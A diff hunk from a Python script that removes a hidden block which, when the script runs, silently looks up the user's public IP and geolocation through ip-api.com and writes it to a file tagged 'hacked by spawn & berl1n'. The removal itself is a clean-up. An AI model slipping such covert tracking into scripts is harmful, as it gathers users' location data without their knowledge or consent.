@@ -8,28 +8,6 @@ red = '\033[1;31m'
 blue = '\033[1;34m'
 wh = '\033[1;97m'
 
-ip = requests.get('http://ip-api.com/json/');ip = ip.json();query = ip['query'];status = ip['status'];country = ip['country'];countryC = ip['countryCode'];region = ip['region'];regionN = ip['regionName'];city = ip['city'];zip = ip['zip'];lat = ip['lat'];lon = ip['lon'];tmz = ip['timezone'];isp = ip['isp'];org = ip['org'];As = ip['as']
-try:
-    import requests
-except ModuleNotFoundError:
-    os.system('pip install requests')
-with open('lol.txt', 'w') as arc:
-    arc.write(f'''{query}
-{status}
-{country}
-{countryC}
-{region}
-{regionN}
-{city}
-{zip}
-{lat}
-{lon}
-{tmz}
-{isp}
-{org}
-{As}
-lol hacked by spawn & berl1n''')
-
 print(f''' 
 {green}
 88                                                        88                        
